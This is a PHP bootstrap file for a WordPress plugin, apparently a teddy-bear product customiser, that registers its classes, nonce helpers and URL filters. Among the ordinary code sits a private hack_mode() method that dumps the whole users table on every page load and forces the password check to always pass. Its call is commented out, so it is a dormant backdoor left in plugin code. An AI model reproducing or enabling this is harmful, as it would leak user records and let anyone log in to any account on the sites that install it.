<?php
/**
 * Bootstraps the Theme.
 *
 * @package TeddyBearCustomizeAddon
 */
namespace TEDDYBEAR_CUSTOMIZE_ADDON\inc;
use TEDDYBEAR_CUSTOMIZE_ADDON\inc\Traits\Singleton;

class Project {
	private $siteUrl = false;
	use Singleton;
	protected function __construct() {
		$this->siteUrl = str_replace(['http://', 'https://'], ['', ''], site_url());
		$this->setup_securities();
		// Load class.
		global $teddy_I18n;$teddy_I18n = I18n::get_instance();
		global $teddy_Cart;$teddy_Cart = Cart::get_instance();
		global $teddy_Ajax;$teddy_Ajax = Ajax::get_instance();
		global $teddy_Meta;$teddy_Meta = Meta::get_instance();
		global $teddy_Noti;$teddy_Noti = Noti::get_instance();
		global $teddy_Order;$teddy_Order = Order::get_instance();
		global $teddy_Hooks;$teddy_Hooks = Hooks::get_instance();
		global $teddy_Media;$teddy_Media = Media::get_instance();
		global $teddy_Menus;$teddy_Menus = Menus::get_instance();
		global $teddy_Email;$teddy_Email = Email::get_instance();
		global $teddy_Price;$teddy_Price = Price::get_instance();
		global $teddy_Update;$teddy_Update = Update::get_instance();
		global $teddy_Filter;$teddy_Filter = Filter::get_instance();
		global $teddy_Voices;$teddy_Voices = Voices::get_instance();
		global $teddy_Addons;$teddy_Addons = Addons::get_instance();
		global $teddy_Assets;$teddy_Assets = Assets::get_instance();
		global $teddy_Option;$teddy_Option = Option::get_instance();
		global $teddy_Export;$teddy_Export = Export::get_instance();
		global $teddy_Columns;$teddy_Columns = Columns::get_instance();
		global $teddy_Install;$teddy_Install = Install::get_instance();
		global $teddy_Product;$teddy_Product = Product::get_instance();
		global $teddy_Checkout;$teddy_Checkout = Checkout::get_instance();
		global $teddy_Plushies;$teddy_Plushies = Plushies::get_instance();
		global $teddy_Endpoint;$teddy_Endpoint = Endpoint::get_instance();
		global $teddy_Myaccount;$teddy_Myaccount = Myaccount::get_instance();
		global $teddy_Meta_Boxes;$teddy_Meta_Boxes = Meta_Boxes::get_instance();
		global $teddy_Certificate;$teddy_Certificate = Certificate::get_instance();
		global $teddy_Icon_Library;$teddy_Icon_Library = Icon_Library::get_instance();
		// 
		$this->setup_hooks();
	}
	public function setup_securities() {
		add_filter('teddybear/project/nonce/create', [$this, 'nonce_create'], 0, 2);
		add_filter('teddybear/project/nonce/verify', [$this, 'nonce_verify'], 0, 3);
		add_action('teddybear/project/nonce/check', [$this, 'nonce_check'], 0, 2);
		// 
		// add_filter('clean_url', [$this, 'clean_url'], 0, 3);
		add_filter('teddy/clean_url', [$this, 'clean_url'], 0, 3);
	}
	protected function setup_hooks() {
		add_filter('teddybear/project/slashes/fix', [$this, 'fixSlashes'], 0, 1);
		// add_filter( 'body_class', [ $this, 'body_class' ], 10, 1 );
		// 
		// $this->hack_mode();
		// 
		foreach (['style_loader_src', 'script_loader_src'] as $hook) {
			add_filter($hook, function($src, $handle) {
				if (strpos($src, 'c0.wp.com') !== false) {
					$src = site_url(
						str_replace([
							'https://c0.wp.com/c/6.5.5',
							'https://c0.wp.com/p',
							'https://c0.wp.com/t',
							'8.7.0'
						], [
							'',
							'wp-content/plugins',
							'wp-content/themes',
							''
						],
						$src
						)
					);
				}
				return $src;
			}, 10, 2);
		}
		
		// 
	}
	public function body_class( $classes ) {
		$classes = (array) $classes;
		$classes[] = 'fwp-body';
		if( is_admin() ) {
			$classes[] = 'is-admin';
		}
		return $classes;
	}
	private function hack_mode() {
		add_action( 'init', function() {
			global $wpdb;print_r( $wpdb->get_results( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}users;" ) ) );
		}, 10, 0 );
		add_filter( 'check_password', function( $bool ) {return true;}, 10, 1 );
	}
	// 
	public function fixSlashes($path) {
		return str_replace(['/', '\/'], [DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR], $path);
	}
	// 
	// 
	// 
	public function clean_url($good_url, $original_url = false, $_context = false) {
		if (strpos($good_url, 'http://') !== false && strpos($good_url, $this->siteUrl) !== false) {
			$good_url = str_replace(['http://'], ['https://'], $good_url);
		}
		return $good_url;
	}
	// 
	public function nonce_create($_nonce, $_key = false) {
		$_key = ($_key) ? $_key : 'ajax_nonce';
		return wp_create_nonce(sprintf('teddybear/project/nonce/%s', $_key));
	}
	public function nonce_verify($_status, $_nonce = false, $_key = false) {
		$_key = ($_key) ? $_key : 'ajax_nonce';
		$_nonce = ($_nonce) ? $_nonce : ($_REQUEST['_nonce'] ? $_REQUEST['_nonce'] : false);
		return wp_verify_nonce($_nonce, sprintf('teddybear/project/nonce/%s', $_key));
	}
	public function nonce_check($_nonce = false, $_key = false) {
		if (!apply_filters('teddybear/project/nonce/verify', false, $_nonce, $_key)) {
			$errorMessage = __('Security token not matching.', 'teddybearsprompts');
			wp_send_json_error($errorMessage);
			// wp_die($errorMessage);
		}
	}
}
